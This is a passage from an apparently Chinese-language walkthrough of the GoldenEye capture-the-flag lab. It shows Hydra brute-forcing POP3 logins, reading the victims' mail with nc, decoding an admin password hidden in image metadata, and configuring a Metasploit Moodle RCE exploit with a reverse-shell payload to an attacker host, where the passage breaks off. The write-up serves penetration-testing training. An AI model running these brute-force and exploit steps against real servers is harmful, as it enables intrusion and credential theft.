success.txt</span></span><br><span class="line"><span class="comment"># Hydra v9.3 run at 2022-08-22 16:50:19 on 10.0.0.101 pop3 (hydra -L name.txt -P password.txt -o success.txt -t 64 -s 55007 10.0.0.101 pop3)</span></span><br><span class="line">[55007][pop3] host: 10.0.0.101   login: boris   password: secret1!</span><br><span class="line">[55007][pop3] host: 10.0.0.101   login: Boris   password: secret1!</span><br><span class="line">[55007][pop3] host: 10.0.0.101   login: natalya   password: bird</span><br><span class="line">[55007][pop3] host: 10.0.0.101   login: Natalya   password: bird</span><br></pre></td></tr></table></figure><h3 id="nc登录pop3查看邮件">nc登录pop3查看邮件</h3><h4 id="boris的邮件">boris的邮件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nc 10.0.0.101 55007     </span></span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user Boris      						<span class="comment"># 输入账号</span></span><br><span class="line">+OK</span><br><span class="line">pass secret1!							<span class="comment"># 输入密码</span></span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">list</span><br><span class="line">+OK 3 messages:</span><br><span class="line">1 544</span><br><span class="line">2 373</span><br><span class="line">3 921</span><br><span class="line">.</span><br><span class="line">retr 1									<span class="comment">#读取邮件</span></span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP <span class="built_in">id</span> D9E47454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I<span class="string">&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 鲍里斯，这是管理员。您可以在此处与同事和学生进行电子交流。我不会扫描电子邮件是否存在安全风险，因为我相信你和这里的其他管理员</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 373 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;natalya@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from ok (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: natalya@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris, I can break your codes!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 3</span></span><br><span class="line"><span class="string">+OK 921 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;alec@janus.boss&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from janus (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: alec@janus.boss</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - Keep security tight or we will be compromised.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 鲍里斯，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 您与我们辛迪加的合作将获得丰厚回报。附件是 GoldenEye 的最终访问代码。将它们放在此服务器根目录中的隐藏文件中，然后从该电子邮件中删除。这些访问代码只能有一组，我们需要保护它们以供最终执行。如果他们被找回并被俘虏，我们的计划将会崩溃和燃烧！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 一旦 Xenia 进入培训站点并熟悉 GoldenEye 终端代码，我们将进入最后阶段......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - 保持安全，否则我们将受到威胁</span></span><br></pre></td></tr></table></figure><h4 id="natalya的邮件">natalya的邮件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nc 10.0.0.101 55007</span></span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user Natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">list</span><br><span class="line">+OK 2 messages:</span><br><span class="line">1 631</span><br><span class="line">2 1048</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP <span class="built_in">id</span> D5EDA454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris<span class="string">&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#娜塔莉亚，请你不要再破坏鲍里斯的密码了。此外，您是 GNO 培训主管。一旦学生被指定给您，我将通过电子邮件发送给您。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#此外，请注意可能的网络漏洞。我们获悉 GoldenEye 正受到一个名为 Janus 的犯罪集团的追捕</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 1048 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;root@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: natalya</span></span><br><span class="line"><span class="string">Delivered-To: natalya@ubuntu</span></span><br><span class="line"><span class="string">Received: from root (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with SMTP id 17C96454B1</span></span><br><span class="line"><span class="string">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: root@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;</span>s related to security...even <span class="keyword">if</span> it<span class="string">&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;</span>ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And <span class="keyword">if</span> you didn<span class="string">&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span></span><br><span class="line"><span class="string">**Make sure to edit your host file since you usually work remote off-network....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Since you&#x27;</span>re a Linux user just point this servers IP to severnaya-station.com <span class="keyword">in</span> /etc/hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">好的，娜塔琳，我有一个新学生要给你。由于这是一个新系统，如果您发现任何配置问题，请让我或鲍里斯知道，尤其是它与安全性有关...即使不是，只需以“安全性”为幌子输入...它会毫不费力地升级变更单 :)</span><br><span class="line"></span><br><span class="line">好的，用户信用是：</span><br><span class="line"></span><br><span class="line">用户名：xenia</span><br><span class="line">密码：RCP90rulez！</span><br><span class="line"></span><br><span class="line">Boris 验证了她是一个有效的承包商，所以只需创建帐户，好吗？</span><br><span class="line"></span><br><span class="line">如果您没有外部内部域的 URL：severnaya-station.com/gnocertdir</span><br><span class="line">**请确保编辑您的主机文件，因为您通常在远程离线工作......</span><br><span class="line"></span><br><span class="line">由于您是 Linux 用户，只需将此服务器 IP 指向 /etc/hosts 中的 severnaya-station.com</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">信息</span><br><span class="line">url:severnaya-station.com/gnocertdir</span><br><span class="line">username:xenia</span><br><span class="line">password:RCP90rulez!</span><br></pre></td></tr></table></figure><p>给项目地址绑定host</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661233375-d5adfcd1b3d055de6ca3b0e8804e9c13.webp" alt="image-20220823134252509"></p><h3 id="访问severnaya-station-com"><a target="_blank" rel="noopener external nofollow noreferrer" href="http://xn--severnaya-station-0173ci33h.com">访问severnaya-station.com</a></h3><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661233946-f41bd8b80a48c13e1b4b63b55306d5eb.webp" alt="image-20220823135223312"></p><p>这是一个php站点 moodle cms</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661238624-c9bb99ee8195bd0f9a0f764fac5d43c3.webp" alt="image-20220823151021217"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661238845-e3f8d89a36795ccff408981f7211b36e.webp" alt="image-20220823151402552"></p><p>发现email username doak</p><p>然后继续hydra爆破</p><p>得到密码 goat</p><h4 id="nc登录doak">nc登录doak</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nc 10.0.0.101 55007</span></span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user doak</span><br><span class="line">+OK</span><br><span class="line">pass goat</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">list</span><br><span class="line">+OK 1 messages:</span><br><span class="line">1 606</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP <span class="built_in">id</span> 97DC24549D</span><br><span class="line">        <span class="keyword">for</span> &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you<span class="string">&#x27;re reading this, congrats you&#x27;</span>ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don<span class="string">&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username: dr_doak</span></span><br><span class="line"><span class="string">password: 4England!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure><p>得到用户密码<mark class="hl-label default">dr_doak:4England!</mark></p><h4 id="登录dr-dock账号">登录dr_dock账号</h4><p>发现特殊文件</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661240187-da02868ad646f9507a5e5688c3c4bf2c.webp" alt="image-20220823153624358"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661240222-4d25395bbfce1a25cf0b5af3f7a77d1b.webp" alt="image-20220823153659039"></p><p>发现url /dir007key/for-007.jpg</p><h4 id="下载图片分析">下载图片分析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># wget http://severnaya-station.com/dir007key/for-007.jpg</span></span><br><span class="line">--2022-08-23 15:38:48--  http://severnaya-station.com/dir007key/for-007.jpg</span><br><span class="line">正在解析主机 severnaya-station.com (severnaya-station.com)... 10.0.0.101</span><br><span class="line">正在连接 severnaya-station.com (severnaya-station.com)|10.0.0.101|:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：14896 (15K) [image/jpeg]</span><br><span class="line">正在保存至: “for-007.jpg”</span><br><span class="line"></span><br><span class="line">for-007.jpg                   100%[=================================================&gt;]  14.55K  --.-KB/s  用时 0s</span><br><span class="line"></span><br><span class="line">2022-08-23 15:38:48 (111 MB/s) - 已保存 “for-007.jpg” [14896/14896])</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># exiftool for-007.jpg</span></span><br><span class="line">ExifTool Version Number         : 12.44</span><br><span class="line">File Name                       : for-007.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 15 kB</span><br><span class="line">File Modification Date/Time     : 2018:04:25 08:40:02+08:00</span><br><span class="line">File Access Date/Time           : 2022:08:23 15:39:33+08:00</span><br><span class="line">File Inode Change Date/Time     : 2022:08:23 15:38:48+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Image Description               : eFdpbnRlcjE5OTV4IQ==</span><br><span class="line">Make                            : GoldenEye</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">Software                        : linux</span><br><span class="line">Artist                          : For James</span><br><span class="line">Y Cb Cr Positioning             : Centered</span><br><span class="line">Exif Version                    : 0231</span><br><span class="line">Components Configuration        : Y, Cb, Cr, -</span><br><span class="line">User Comment                    : For 007</span><br><span class="line">Flashpix Version                : 0100</span><br><span class="line">Image Width                     : 313</span><br><span class="line">Image Height                    : 212</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 313x212</span><br><span class="line">Megapixels                      : 0.066</span><br></pre></td></tr></table></figure><p>发现描述里的内容有点特殊,有两个==号 猜测可能经过base64编码</p><p>尝试base64解码</p><p>得到<mark class="hl-label default">xWinter1995x!</mark></p><h4 id="使用得到的密码进行admin登录">使用得到的密码进行admin登录</h4><p>登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661240985-40d336430f93162907c0b9d67679a603.webp" alt="image-20220823154942844"></p><h3 id="信息搜集汇总">信息搜集汇总</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.101</span><br><span class="line">host:severnaya-station.com</span><br><span class="line">posts:25,80,55006,5007</span><br><span class="line"></span><br><span class="line">cms:2.2.3 moodle</span><br><span class="line"></span><br><span class="line">账户密码</span><br><span class="line">url: 10.0.0.101 55007</span><br><span class="line">boris:secret1!</span><br><span class="line">natalya:bird</span><br><span class="line">doak:goat</span><br><span class="line"></span><br><span class="line">url:severnaya-station.com/gnocertdir</span><br><span class="line">xenia:RCP90rulez!</span><br><span class="line">dr_doak:4England!</span><br><span class="line">admin:xWinter1995x!</span><br></pre></td></tr></table></figure><h2 id="漏洞利用">漏洞利用</h2><p>已知 cms为2.2.3 moodle</p><p>谷歌搜索moodle 2.2.3 exploit</p><p>在exploit-db找到 cve2013-3630</p><h4 id="使用msf进行漏洞利用">使用msf进行漏洞利用</h4><h5 id="搜索exp">搜索exp</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole</span></span><br><span class="line"></span><br><span class="line">                                   ____________</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| <span class="variable">$a</span>,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| <span class="variable">$S</span>`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]</span><br><span class="line"> [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]</span><br><span class="line"> [% |        ||  -__||   _||  _  ||  ,,aS$<span class="string">&quot;&quot;</span>`  ||  _  ||  ||  _  ||  ||   _|%%]</span><br><span class="line"> [% |__|__|__||_____||____||___._||%<span class="variable">$P</span><span class="string">&quot;`       ||   __||__||_____||__||____|%%]</span></span><br><span class="line"><span class="string"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `&quot;</span>a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`<span class="string">&quot;a,$<span class="variable">$__</span>|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span></span><br><span class="line"><span class="string"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `&quot;</span>$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.2.11-dev                          ]</span><br><span class="line">+ -- --=[ 2233 exploits - 1179 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: After running db_nmap, be sure to</span><br><span class="line">check out the result of hosts and services</span><br><span class="line"></span><br><span class="line">msf6 &gt; search moodle</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                                          Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/moodle_admin_shell_upload                  2019-04-28       excellent  Yes    Moodle Admin Shell Upload</span><br><span class="line">   1  exploit/multi/http/moodle_spelling_binary_rce                 2013-10-30       excellent  Yes    Moodle Authenticated Spelling Binary RCE</span><br><span class="line">   2  exploit/multi/http/moodle_spelling_path_rce                   2021-06-22       excellent  Yes    Moodle SpellChecker Path Authenticated Remote Command Execution</span><br><span class="line">   3  exploit/multi/http/moodle_teacher_enrollment_priv_esc_to_rce  2020-07-20       good       Yes    Moodle Teacher Enrollment Privilege Escalation to RCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/moodle_teacher_enrollment_priv_esc_to_rce</span><br></pre></td></tr></table></figure><p>也可以搜索 cve 2013-3630</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search cve 2013-3630</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/moodle_spelling_binary_rce  2013-10-30       excellent  Yes    Moodle Authenticated Spelling Binary RCE</span><br><span class="line">   1  exploit/multi/http/moodle_spelling_path_rce    2021-06-22       excellent  Yes    Moodle SpellChecker Path Authenticated Remote Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/moodle_spelling_path_rce</span><br></pre></td></tr></table></figure><h5 id="使用exp">使用exp</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole                        ---进入MSF框架攻击界面</span><br><span class="line">search moodle                     ---查找 moodle类型 攻击的模块</span><br><span class="line">use 0                             ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本</span><br><span class="line">set username admin                ---设置用户名：admin</span><br><span class="line">set password xWinter1995x!        ---设置密码：xWinter1995x!</span><br><span class="line">set rhost severnaya-station.com   ---设置：rhosts severnaya-station.com</span><br><span class="line">set targeturi /gnocertdir         ---设置目录： /gnocertdir</span><br><span class="line">set payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse</span><br><span class="line">set lhost 10.0.0.3           ---设置：lhost 